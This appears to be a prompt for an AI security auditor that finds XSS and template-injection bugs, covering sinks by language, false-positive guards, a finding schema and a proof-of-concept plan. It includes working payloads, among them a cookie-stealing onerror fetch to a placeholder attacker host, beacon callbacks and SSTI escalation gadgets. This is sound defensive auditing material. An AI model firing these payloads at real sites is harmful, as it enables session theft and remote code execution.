<!--
FINDER PROMPT — xss-ssti. You are a fresh-context auditor hunting ONE class:
XSS & Template Injection. Read the target's code; emit finding objects.
Signal discipline (AGENTS.md) is binding: only a REACHABLE untrusted-input →
HTML/JS/template sink with no effective escaping/sanitizer on the path is a
finding. No defense-in-depth musings, no dead code, no posture items.
-->

# Finder — XSS & Template Injection (xss-ssti)

**Class key:** `xss-ssti` · **OWASP:** A05:2025 · **CWE:** CWE-79, CWE-1336, CWE-116 · **ASVS:** V1/V3

## 1. Objective

Find places where untrusted input reaches an HTML/JS/DOM rendering sink without
contextually-correct escaping (XSS), or reaches a template engine as *template
source* rather than *data* (SSTI). The bug is attacker bytes interpreted as
markup, script, or template code — not just displayed as text.

## 2. Where to look

Entry points where a request value, stored record, or external payload becomes
part of an HTML response, a DOM mutation, or a compiled template:

- **Server-rendered views:** controllers/handlers that build HTML strings,
  interpolate into templates, or pass user data to a view. Look at view files
  (`.erb`, `.ecr`, `.haml`, `.slim`, `.ejs`, `.pug`, `.hbs`, `.jinja`/`.html`,
  `.blade.php`, `.gohtml`/`.tmpl`, JSP/Thymeleaf) and any helper that emits
  "raw"/"safe"/"unescaped" output.
- **JSON/API → client render:** API returns user data that a SPA injects via
  `innerHTML`/`v-html`/`dangerouslySetInnerHTML`; or server embeds user data
  into an inline `<script>` JSON island (`<script>var d = {{ data }}</script>`).
- **DOM XSS surfaces (client JS):** reads of `location.*`, `document.URL`,
  `referrer`, `name`, `postMessage` data, `localStorage`, hash/query parsing,
  flowing into `innerHTML`, `document.write`, `eval`, `setAttribute("href"...)`,
  jQuery `.html()/.append()`, framework bypass APIs.
- **Template-as-data confusion (SSTI):** user input used to *build* a template
  string, choose a template name/path, or rendered inline (email/notification
  templating, report builders, CMS "custom template" fields, `render inline:`,
  Handlebars/Mustache where the *template* itself is user-supplied).
- **Markdown/rich-text/SVG/email:** Markdown→HTML renderers with raw-HTML
  passthrough, WYSIWYG body stored then re-rendered (stored XSS), uploaded SVG
  served inline, HTML email previews.
- **Reflected surfaces:** error pages echoing the bad input, search-result
  pages, `redirect`/`next` params written into `<a href>` or `<meta refresh>`,
  filenames/headers reflected into HTML.
- **Attribute / URL / JS-string contexts:** values placed inside `href`/`src`
  (→ `javascript:` URIs), event-handler attributes, `style`, or inside an inline
  script — each needs context-specific encoding, not just HTML-entity escaping.

Per-language sink/render signals:

- **Crystal:** ECR `<%= %>` is **not** auto-escaped (use `<%= ... %>` with manual
  `HTML.escape` — raw by default); Kemal/Lucky raw helpers, `env.response.print`
  of interpolated HTML, `String#to_s` into ECR without `HTML.escape`.
- **Ruby:** `raw`, `html_safe`, `.html_safe`, `<%== %>` (Erubi raw), `sanitize`
  misuse, `content_tag` with raw, `render inline: params[...]`, ERB.new on user
  string, Slim/Haml `==`, `raw()` in Sinatra; SSTI via Liquid/ERB template
  source from input.
- **Node/TS:** `res.send("<...>"+x)`, `dangerouslySetInnerHTML={{__html:x}}`
  (React), `v-html` (Vue), `[innerHTML]` (Angular) / `bypassSecurityTrustHtml`,
  `el.innerHTML=`, `document.write`, EJS `<%- %>`, Pug `!{}`/`unescaped`,
  Handlebars triple-stash `{{{ }}}` or `SafeString`, `_.template`, Nunjucks
  `{% autoescape false %}` / `| safe`; SSTI via `new Function`,
  `eval`, `vm.runInNewContext`, or template compiled from user string.
- **Python:** Jinja2 `| safe`, `Markup(x)`, `{% autoescape false %}`,
  `render_template_string(user)` (classic SSTI), `flask.Markup`, Django
  `mark_safe`, `format_html` misuse, `{% autoescape off %}`, f-string/`%`/
  `.format` building a template then `Template(s).render(...)`, Mako default
  (no auto-escape).
- **Go:** `text/template` (NO auto-escaping — XSS by design if HTML output),
  `template.HTML(x)` / `template.JS` / `template.URL` (bypass `html/template`
  escaping), `fmt.Fprintf(w, "<...>"+x)`, `w.Write([]byte("<b>"+x))`.
- **PHP:** `echo $_GET[...]`, `print`, string interpolation into HTML,
  `Twig` `|raw` / `autoescape false`, Blade `{!! !!}` (unescaped) vs `{{ }}`,
  Smarty `{$x nofilter}`; SSTI via `eval`, `create_function`, Twig template
  from user string.
- **Java/JVM:** JSP `<%= %>` (unescaped) / `<c:out escapeXml="false">`,
  Thymeleaf `th:utext` (unescaped) vs `th:text`, FreeMarker/Velocity with user
  template source (SSTI), `response.getWriter().print(req.getParameter(...))`,
  Spring `@ResponseBody` returning raw HTML, JSF EL `${param.x}` rendered.
- **Rust:** `askama`/`maud` are escaped by default — flag `| safe`-equivalents,
  `PreEscaped`/`Markup` (maud) wrapping user data, `Html(format!("<b>{}",x))`
  in axum/actix, `tera` `| safe` / `autoescape` disabled, raw `write!` of HTML.

## 3. Detection heuristics

**Taint SOURCES** (untrusted): HTTP query/body/path/header values (incl.
`Referer`, `User-Agent`, `X-Forwarded-*`, `Host`), cookies, uploaded file
names/contents, **stored DB rows that were user-set** (stored XSS — the highest-
value variant), webhook/queue payloads, `location.href`/`hash`/`search`,
`document.referrer`, `window.name`, `postMessage` `event.data`, `localStorage`/
`sessionStorage`, and any value derived from these.

**Taint SINKS** (dangerous op): the render/DOM/template calls in §2 where the
output is *interpreted* (parsed as HTML, executed as JS, or compiled as a
template) rather than emitted as inert text. The decisive question is **does an
effective, context-correct encoder sit between source and sink?**

Vulnerable patterns to confirm (real APIs):

- **Reflected XSS — direct echo:**
  - Node: `res.send(`<h1>${req.query.q}</h1>`)`
  - PHP: `echo "Hello ".$_GET['name'];`
  - Python: `return f"<p>{request.args['q']}</p>"` (no template escaping)
  - Go: `fmt.Fprintf(w, "<div>%s</div>", r.FormValue("q"))`
  - Java: `out.print("<p>"+request.getParameter("q")+"</p>");`
- **Disabled / bypassed auto-escaping in a template:**
  - Ruby: `<%= params[:bio].html_safe %>` / `raw user.bio`
  - Jinja2: `{{ user.bio | safe }}` / `Markup(user.bio)` / `{% autoescape off %}`
  - React: `<div dangerouslySetInnerHTML={{__html: comment.body}} />`
  - Vue: `<div v-html="comment.body">` ; Angular: `[innerHTML]="body"` after
    `bypassSecurityTrustHtml(body)`
  - Handlebars: `{{{ body }}}` ; EJS: `<%- body %>` ; Blade: `{!! $body !!}` ;
    Thymeleaf: `th:utext="${body}"`
  - Go: `template.HTML(userData)` passed to `html/template`
- **DOM XSS:**
  - `el.innerHTML = location.hash.slice(1)`
  - `document.write(new URLSearchParams(location.search).get("q"))`
  - `$("#out").html(userInput)` ; `eval(location.hash)` ;
    `a.href = userInput` (→ `javascript:alert(1)`)
- **Server-Side Template Injection (CWE-1336) — user controls the template, not
  the data:**
  - Python/Flask: `render_template_string("Hi "+request.args["name"])` →
    payload `{{7*7}}`/`{{config}}`/`{{request.application...}}` → RCE on Jinja2.
  - Ruby: `ERB.new(params[:tpl]).result(binding)` / `render inline: params[:t]`
  - Node: `handlebars.compile(req.body.tpl)` ; `_.template(userTpl)` ;
    `new Function("return `"+userTpl+"`")()`
  - Java: FreeMarker `new Template("t", new StringReader(userTpl), cfg)` ;
    Velocity `Velocity.evaluate(ctx, w, "t", userTpl)`
  - PHP: Twig `$twig->createTemplate($_GET['t'])->render()`
  - Signal: input is concatenated/passed where a *template literal/string* is
    expected, or selects the template name (`render(params[:view])` →
    traversal/engine-specific injection).
- **Wrong-context encoding (encoded but still injectable):** HTML-entity escaped
  but placed inside a JS string (`<script>var x="{{ q }}"</script>` → break out
  with `</script>`), inside an unquoted attribute (` onmouseover=...`), or inside
  `href`/`src` (entity-escaping does not stop `javascript:`/`data:` URIs).
- **Unsafe sanitizer config / raw passthrough in Markdown:** `marked` with
  `sanitize:false` (or modern `marked` which dropped sanitize — needs external
  sanitizer), `markdown-it({html:true})`, Python `markdown` with no bleach,
  `Redcarpet.new(..., filter_html: false)`, Goldmark with `WithUnsafe()`.

## 4. Not-a-finding (false-positive guard) — check BEFORE flagging

Do NOT report if any of these is present AND effective for the **specific output
context**:

- **Framework auto-escaping left ON, value emitted through the escaped path:**
  Rails ERB `<%= %>` (auto-escapes), React `{value}` (JSX text — escaped), Vue
  `{{ }}` (escaped), Angular interpolation `{{ }}` (escaped + built-in
  sanitizer), Jinja2/Twig/Nunjucks/Tera default autoescape, `html/template`
  (Go), Blade `{{ }}`, Thymeleaf `th:text`, askama/maud (Rust) defaults,
  ECR/Crystal only if `HTML.escape` is applied. Escaped text output is inert.
- **Contextually-correct encoder applied:** `HTML.escape`/`ERB::Util.html_escape`,
  `CGI.escapeHTML`, `htmlspecialchars($x, ENT_QUOTES, 'UTF-8')`, Go `html
  /template` auto or `template.HTMLEscapeString`, Java `OWASP Encoder`
  (`Encode.forHtml`/`forJavaScript`/`forUriComponent`), `DOMPurify.sanitize(x)`
  before `innerHTML`, `textContent`/`innerText`/`createTextNode` (NOT
  `innerHTML`), `setAttribute` for non-URL attrs. The encoder must match the
  context (HTML body vs attribute vs JS vs URL) — HTML-entity escaping inside a
  JS/URL context is NOT effective.
- **Vetted HTML sanitizer on a raw-HTML feature:** `DOMPurify.sanitize`,
  Rails `sanitize`/`sanitize_helper` with a restrictive allowlist, Python
  `bleach.clean` / `nh3`, `sanitize-html` (Node) with a safe config, OWASP
  Java HTML Sanitizer, Go `bluemonday` `UGCPolicy`/`StrictPolicy`. Effective
  only if the config strips scripts/event handlers/`javascript:` URIs and is
  applied on the path to the sink (check the actual policy, not just its
  presence).
- **SSTI guard:** the user value is passed as a **template variable / context
  data**, never as template source, and the template file/name is a fixed
  literal or chosen from a closed allowlist (not built from input). Logic-less
  engines (Mustache, or Handlebars without helpers) rendering a *fixed* template
  with user *data* are not SSTI.
- **Value is provably non-HTML by type/validation before the sink:** strict
  allowlist (enum, numeric cast, UUID/regex `^[\w-]+$` that excludes
  `<>"'&`/backtick), or a URL validated to `http(s)` scheme with a real parser
  before being put in `href`. A type that cannot carry markup (integer, bool,
  enum) reaching an HTML sink is safe.
- **CSP is NOT a substitute:** a `Content-Security-Policy` may reduce impact but
  does not make an otherwise-injectable sink "not a finding" — only downgrade
  severity if the CSP is strict (nonce/hash-based, no `unsafe-inline`,
  no overly-broad host allowlist) AND verifiably served on the affected
  response. Note it in `sanitizers_checked`; do not let it zero out a clear
  injection.
- **No untrusted source on the path:** the rendered value is a hardcoded
  constant, an i18n string from a trusted bundle, or operator-set config — not
  user/stored input.

If a guard exists but is bypassable — wrong context (HTML-escaped value in a JS
or URL context), permissive sanitizer config (allows `<script>`/`on*`/`href`
javascript:), regex that misses an encoding, escaping applied *after* a `raw`/
`html_safe` marking that already trusted the string — it is NOT a mitigation:
flag it and name the bypass in `sanitizers_checked`.

## 5. Severity guidance

- **Critical** — **SSTI with code execution** on the server (Jinja2/Twig/
  FreeMarker/ERB/Velocity reaching `{{7*7}}`→RCE), OR unauthenticated **stored
  XSS** on a high-traffic/authenticated surface that runs in victims' sessions
  (admin panel, shared dashboard) enabling account/session takeover at scale.
  Attacker controls markup with no effective escaping and no blocking CSP.
- **High** — stored XSS requiring some auth/condition but hitting other users'
  sessions (cookie/session theft, CSRF-token exfil, action-on-behalf), or
  reflected XSS on an authenticated/sensitive page with a realistic delivery
  vector and no strict CSP. Client-side SSTI (e.g. AngularJS sandbox escape) on
  a real surface.
- **Medium** — reflected XSS needing unlikely user interaction or a same-origin
  precondition, XSS materially constrained by a partial CSP, self-XSS that
  crosses a trust boundary only with effort, or an injectable sink behind a
  permissive-but-not-trivial sanitizer.
- **Low/Info** — output in a context where breakout is blocked by an effective
  strict CSP plus context-correct partial encoding (residual risk only), or a
  raw-HTML helper fed solely operator-controlled content (defense-in-depth
  note, not a body finding).

Stored XSS outranks reflected at equal reach (no delivery step, persistent,
fires for every viewer) — note persistence in `rationale`. SSTI defaults to
critical/high because it usually escalates beyond XSS to RCE/secret disclosure.

## 6. Emit findings as

One JSON object per distinct root cause (dedup call sites; list extras in
`rationale`). Fields:

```json
{
  "id": "xss-ssti-001",
  "title": "Stored XSS via raw bio render in profile view",
  "vuln_class": "xss-ssti",
  "owasp": "A05:2025",
  "cwe": "CWE-79",
  "asvs": "V1/V3",
  "severity": "high",
  "status": "likely",
  "confidence": "high",
  "file": "app/views/profiles/show.html.erb",
  "line": 14,
  "end_line": 14,
  "code_excerpt": "<div class=\"bio\"><%= raw @user.bio %></div>",
  "source": "@user.bio — stored DB column set by the user via PATCH /profile (params[:user][:bio]), no server-side HTML stripping on write",
  "sink": "ERB raw() — emits @user.bio as unescaped HTML into the response body",
  "data_flow": "params[:user][:bio] -> User#bio (persisted, no sanitize on update) -> show.html.erb `raw @user.bio` -> HTML body; Rails auto-escaping explicitly defeated by raw()",
  "sanitizers_checked": "raw() bypasses ERB auto-escape; no sanitize()/DOMPurify on write or read path; no allowlist on bio; no CSP header on this response (checked layouts/application.html.erb); rendered in HTML body context where <script>/<img onerror> execute",
  "rationale": "Any authenticated user stores markup that executes in every viewer's session when the profile is opened — session/cookie theft, CSRF-token exfil. Same raw() pattern at profiles/show.html.erb:31 (signature field).",
  "exploit_sketch": "PATCH /profile bio=<img src=x onerror=fetch('//atk/c?'+document.cookie)>; victim views /profiles/<id> -> payload fires in their session.",
  "dynamic_poc_plan": "Save the payload via the profile form, open the profile as a second logged-in user, observe the OOB callback receiving that user's cookie/marker; confirms cross-user execution.",
  "proposed_fix": "Render @user.bio through an escaped/sanitized path instead of treating it as trusted HTML, so stored user input can no longer execute as markup in viewers' sessions; the exact mechanism (default escaping vs. allowlist sanitizer for rich text) is for the implementer to choose."
}
```

Accuracy bar: `source`, `sink`, `data_flow`, and `sanitizers_checked` must be
concrete and true. `data_flow` traces the variable source→sink, states the
**output context** (HTML body / attribute / JS string / URL / template source),
and names any encoder/sanitizer encountered and why it fails or is absent.
`sanitizers_checked` is the §4 FP guard made explicit — list each relevant
control (auto-escape state, encoder context-match, sanitizer policy, SSTI
data-vs-source check, CSP) and state it is absent or name the exact bypass. A
finding without an untrusted source reaching an interpreted sink is not a
finding. Use `status:"likely"` for a proven static trace, `"confirmed"` only
after dynamic repro, `"triage"` if reachability/source/context is uncertain.

## 7. Dynamic PoC strategy

Goal: prove attacker bytes are *interpreted* (script executes / template
evaluates), not merely echoed as text. Pick the oracle by sub-class:

1. **Reflected/DOM XSS — execution oracle:** send the payload via the affected
   param/hash/header and confirm script *runs*, not just appears. Inert proof:
   the response contains the raw, unescaped `<script>`/`onerror=` (grep the body
   for the payload with angle brackets intact, not entity-encoded). Live proof:
   drive a headless browser (Playwright/puppeteer) to the URL with a unique
   beacon (`<img src=x onerror="fetch('http://<listener>/xss-<nonce>')">` or
   `<script>navigator.sendBeacon('http://<listener>/<nonce>')</script>`) and
   observe the listener receive the nonce — that proves DOM/script execution.
   Try multiple contexts if entity-escaped: attribute breakout
   (`" onmouseover=...`), JS-string breakout (`</script><script>...`),
   `javascript:`/`data:` URI in `href`/`src`.
2. **Stored XSS — cross-user execution oracle:** persist the beacon payload via
   the write endpoint (as user A), then load the rendering page as a *second*
   session/user (B) in a headless browser; confirm the listener receives the
   beacon carrying B's context (e.g. B's cookie/marker). This proves persistence
   + cross-user firing, the high-severity property.
3. **SSTI — evaluation oracle:** send an engine-appropriate probe that an escaper
   could not produce: arithmetic `{{7*7}}` / `${7*7}` / `#{7*7}` / `<%= 7*7 %>`
   and confirm the response contains `49` (proves the template engine evaluated
   input). Escalate cautiously to confirm reach: Jinja2 `{{config}}` or
   `{{request.application.__globals__}}`, Twig `{{_self}}`,
   FreeMarker `<#assign x="freemarker.template.utility.Execute"?new()>` — for the
   PoC, demonstrate a benign capability (read a known config value or echo a
   process marker) rather than running destructive commands. `49` in the
   response from a `7*7` input is sufficient to set `reproduced:true`.

For each, record the exact request/payload, the affected context, and the
observed evidence in the `Repro` object (`reproduced`, `method:"live-exploit"`
for browser-confirmed execution or SSTI eval, `"static-poc"` if only the raw
unescaped reflection is shown without a browser, `poc`, `observed`, `impact`).
If a CSP is present, note in `notes` whether it actually blocked execution in the
headless run (a payload that reflects but is CSP-blocked is a weaker finding —
reflect that in severity).
